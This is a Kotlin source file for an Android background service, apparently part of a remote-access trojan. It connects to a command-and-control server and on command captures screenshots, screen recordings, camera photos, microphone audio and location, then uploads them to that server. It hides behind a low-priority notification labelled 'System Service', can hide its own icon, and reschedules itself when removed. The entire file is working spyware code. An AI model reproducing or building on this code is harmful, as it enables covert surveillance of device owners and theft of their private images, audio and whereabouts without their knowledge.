package com.outcome.c2

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.os.SystemClock
import android.util.Base64
import androidx.core.app.NotificationCompat
import io.socket.client.IO
import io.socket.client.Socket
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.URI
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

class TelegramC2Service : Service() {

    companion object {
        private const val TAG = "C2Agent"
        private const val NOTIF_ID = 2
        private const val CHANNEL_ID = "c2agent"
    }

    private val serverUrl: String = BuildConfig.C2_URL
    private val apiKey: String = BuildConfig.API_KEY

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(70, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val deviceId: String by lazy { DeviceInfo.id(this) }

    @Volatile private var projection: MediaProjection? = null
    @Volatile private var captureSession: ScreenCaptureSession? = null

    @Volatile private var socket: Socket? = null
    @Volatile private var connected: Boolean = false
    private var reconnectJob: Job? = null
    private val connecting = AtomicBoolean(false)

    @Volatile private var startedAt: Long = System.currentTimeMillis()
    @Volatile private var commandCount: Int = 0

    private fun log(msg: String) {
        android.util.Log.i(TAG, msg)
        LogBus.append(applicationContext, "C2", msg)
    }

    override fun onCreate() {
        super.onCreate()
        log("onCreate deviceId=$deviceId")
        startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
        startedAt = System.currentTimeMillis()
        connectSocket()
        WatchdogReceiver.schedule(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        log("onStartCommand action=${intent?.action}")
        if (intent?.action == "START_PROJECTION") {
            val code = intent.getIntExtra("proj_result_code", Int.MIN_VALUE)
            val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
                intent.getParcelableExtra("proj_data", Intent::class.java)
            else
                @Suppress("DEPRECATION") intent.getParcelableExtra("proj_data")
            if (code != Int.MIN_VALUE && data != null) {
                startForegroundCompat(ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
                initProjectionFromIntent(code, data)
            }
        }
        if (reconnectJob?.isActive != true) connectSocket()
        return START_STICKY
    }

    private fun startForegroundCompat(type: Int) {
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                startForeground(NOTIF_ID, notification, type)
            } else {
                startForeground(NOTIF_ID, notification)
            }
        } catch (e: Exception) {
            log("startForeground failed: ${e.message}")
        }
    }

    private fun initProjectionFromIntent(resultCode: Int, data: Intent) {
        log("initProjection: code=$resultCode")
        try {
            captureSession?.release()
            captureSession = null
            try { projection?.stop() } catch (_: Exception) {}
            projection = null

            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            val proj = mpm.getMediaProjection(resultCode, data)
            log("getMediaProjection: $proj")
            if (proj == null) return

            proj.registerCallback(object : MediaProjection.Callback() {
                override fun onStop() {
                    log("projection onStop")
                    captureSession?.release()
                    captureSession = null
                    projection = null
                    sendState()
                }
            }, Handler(Looper.getMainLooper()))

            projection = proj
            captureSession = ScreenCaptureSession(this, proj)
            log("projection ACTIVE with capture session")
            sendState()
        } catch (e: Exception) {
            log("initProjection ERROR: ${e.message}")
            projection = null
            captureSession = null
        }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(CHANNEL_ID, "Agent", NotificationManager.IMPORTANCE_MIN)
            (getSystemService(NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service")
            .setContentText("running")
            .setSmallIcon(android.R.drawable.stat_sys_download)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()
    }

    // ---------- Socket.IO ----------

    private fun connectSocket() {
        reconnectJob?.cancel()
        reconnectJob = scope.launch {
            while (isActive) {
                if (!connected && socket == null) {
                    if (connecting.compareAndSet(false, true)) {
                        try { doConnect() } finally { connecting.set(false) }
                    }
                }

                var waited = 0
                while (isActive && !connected && waited < 30000) {
                    delay(500)
                    waited += 500
                }

                while (isActive && connected) {
                    delay(2000)
                }

                if (isActive && !connected) {
                    delay(3000)
                }
            }
        }
    }

    private fun doConnect() {
        try {
            try { socket?.off() } catch (_: Exception) {}
            try { socket?.disconnect() } catch (_: Exception) {}
            try { socket?.close() } catch (_: Exception) {}
            socket = null
            connected = false

            // ⚠️ namespace /agent via URI path
            val base = serverUrl.trimEnd('/')
            val uri = URI("$base/agent")

            val opts = IO.Options().apply {
                reconnection = false
                timeout = 20000
                forceNew = true
                transports = arrayOf("polling", "websocket")
                upgrade = true
                auth = mapOf(
                    "api_key" to apiKey,
                    "device_id" to deviceId,
                    "model" to Build.MODEL,
                    "manufacturer" to Build.MANUFACTURER,
                    "android_version" to Build.VERSION.RELEASE,
                    "sdk_int" to Build.VERSION.SDK_INT.toString(),
                    "hostname" to Build.HOST,
                )
                path = "/socket.io"
            }
            val s = IO.socket(uri, opts)
            socket = s

            s.on(Socket.EVENT_CONNECT) {
                if (connected) return@on
                log("socket connected")
                connected = true
            }
            s.on(Socket.EVENT_DISCONNECT) { args ->
                val reason = args.firstOrNull()?.toString() ?: "?"
                log("socket disconnected: $reason")
                connected = false
            }
            s.on(Socket.EVENT_CONNECT_ERROR) { args ->
                val msg = args.firstOrNull()?.toString() ?: "?"
                log("socket error: $msg")
                connected = false
            }
            s.on("accept") { args ->
                val obj = args.firstOrNull() as? JSONObject ?: return@on
                val accepted = obj.optString("device_id", "")
                log("accepted device_id=$accepted")
                val cmds = obj.optJSONArray("commands") ?: JSONArray()
                for (i in 0 until cmds.length()) {
                    val c = cmds.getJSONObject(i)
                    scope.launch { handleCommand(c) }
                }
            }
            s.on("command") { args ->
                val obj = args.firstOrNull() as? JSONObject ?: return@on
                scope.launch { handleCommand(obj) }
            }
            s.on("reject") { args ->
                val obj = args.firstOrNull() as? JSONObject ?: return@on
                log("agent rejected: ${obj.optString("error")}")
            }

            log("socket connecting to $uri…")
            s.connect()
        } catch (e: Exception) {
            log("doConnect exception: ${e.message}")
        }
    }

    private fun sendState() {
        try {
            if (!connected) return
            val bat = batteryPct()
            val loc = Location.get(this@TelegramC2Service)
            val payload = JSONObject().apply {
                put("device_id", deviceId)
                put("battery", bat)
                if (!loc.has("error")) {
                    put("latitude", loc.optDouble("lat"))
                    put("longitude", loc.optDouble("lng"))
                }
            }
            socket?.emit("state", payload)
        } catch (_: Exception) {}
    }

    // ---------- Command handling ----------

    private suspend fun handleCommand(obj: JSONObject) {
        val id = obj.optInt("id", -1)
        val type = obj.optString("type", "")
        val args = obj.optJSONObject("args") ?: JSONObject()
        if (id < 0 || type.isEmpty()) return

        log("execute id=$id type=$type")
        commandCount++

        val result = try {
            when (type) {
                "screenshot" -> {
                    val s = captureSession
                    if (s == null) JSONObject().put("error", "projection_not_ready")
                    else s.capture()
                }
                "screen_record" -> {
                    val p = projection
                    if (p == null) JSONObject().put("error", "projection_not_ready")
                    else ScreenRecorder.start(this, p, args.optInt("duration", 20))
                }
                "hide_icon" -> IconHider.hide(this)
                "show_icon" -> IconHider.show(this)
                else -> CommandExecutor.run(this, type, args)
            }
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "unknown")
        }

        val success = !result.has("error")
        log("result id=$id ok=$success")

        val payload = JSONObject().apply {
            put("command_id", id)
            put("device_id", deviceId)
            put("success", success)
            put("result", result)
        }
        socket?.emit("result", payload)

        val b64 = result.optString("data_b64", "")
        if (b64.isNotEmpty()) {
            val category = when (type) {
                "screenshot" -> "screenshot"
                "camera_photo" -> "camera"
                "mic_record" -> "mic"
                else -> "misc"
            }
            val ext = when (type) {
                "screenshot", "camera_photo" -> "jpg"
                "mic_record" -> "m4a"
                else -> "bin"
            }
            try {
                uploadB64(id, category, b64, "$type.$ext")
            } catch (e: Exception) {
                log("upload: ${e.message}")
            }
        }

        if (type == "screen_record" && success) {
            val path = result.optString("path", "")
            if (path.isNotEmpty()) {
                val f = File(path)
                if (f.exists()) {
                    try {
                        uploadFile(id, "screen_record", f)
                    } catch (e: Exception) {
                        log("upload rec: ${e.message}")
                    }
                }
            }
        }
    }

    private suspend fun uploadB64(cmdId: Int, category: String, b64: String, filename: String) {
        withContext(Dispatchers.IO) {
            try {
                val bytes = Base64.decode(b64, Base64.NO_WRAP)
                val url = serverUrl.trimEnd('/') + "/api/agent/upload"
                val fileBody = bytes.toRequestBody("application/octet-stream".toMediaType())
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("category", category)
                    .addFormDataPart("command_id", cmdId.toString())
                    .addFormDataPart("file", filename, fileBody)
                    .build()
                val req = Request.Builder()
                    .url(url)
                    .addHeader("X-Api-Key", apiKey)
                    .post(body)
                    .build()
                client.newCall(req).execute().use { }
                log("uploaded $filename")
            } catch (e: Exception) {
                log("uploadB64: ${e.message}")
            }
        }
    }

    private suspend fun uploadFile(cmdId: Int, category: String, file: File) {
        withContext(Dispatchers.IO) {
            try {
                val url = serverUrl.trimEnd('/') + "/api/agent/upload"
                val fileBody = file.readBytes().toRequestBody("application/octet-stream".toMediaType())
                val body = MultipartBody.Builder().setType(MultipartBody.FORM)
                    .addFormDataPart("device_id", deviceId)
                    .addFormDataPart("category", category)
                    .addFormDataPart("command_id", cmdId.toString())
                    .addFormDataPart("file", file.name, fileBody)
                    .build()
                val req = Request.Builder()
                    .url(url)
                    .addHeader("X-Api-Key", apiKey)
                    .post(body)
                    .build()
                client.newCall(req).execute().use { }
                log("uploaded ${file.name}")
            } catch (e: Exception) {
                log("uploadFile: ${e.message}")
            }
        }
    }

    private fun batteryPct(): Int {
        return try {
            val bm = getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
            bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        } catch (_: Exception) { 0 }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        log("onTaskRemoved — scheduling restart")
        try {
            val restart = Intent(applicationContext, TelegramC2Service::class.java)
            val flags = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            else PendingIntent.FLAG_UPDATE_CURRENT
            val pi = PendingIntent.getService(applicationContext, 0xC3, restart, flags)
            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
            am.set(
                android.app.AlarmManager.ELAPSED_REALTIME,
                SystemClock.elapsedRealtime() + 2000,
                pi
            )
        } catch (_: Exception) {}
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        log("onDestroy")
        reconnectJob?.cancel()
        try { socket?.off() } catch (_: Exception) {}
        try { socket?.disconnect() } catch (_: Exception) {}
        try { socket?.close() } catch (_: Exception) {}
        socket = null
        connected = false
        captureSession?.release()
        captureSession = null
        try { projection?.stop() } catch (_: Exception) {}
        projection = null
        scope.cancel()
        super.onDestroy()
    }
}
